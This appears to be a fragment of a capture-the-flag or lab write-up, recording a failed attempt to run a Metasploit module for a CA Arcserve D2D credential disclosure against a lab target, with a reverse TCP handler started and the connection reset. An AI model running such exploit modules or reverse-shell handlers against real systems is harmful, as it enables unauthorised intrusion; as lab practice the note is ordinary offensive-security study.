- Tried `exploit/windows/http/ca_arcserve_rpc_authbypass : CA Arcserve D2D GWT RPC Credential Information Disclosure ` in msfconsole, but no luck 

```bash 
msf6 exploit(windows/http/ca_arcserve_rpc_authbypass) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Sending request to 10.10.10.204:29819
[-] Exploit failed [disconnected]: Errno::ECONNRESET Connection reset by peer
[*] Exploit completed, but no session was created.

```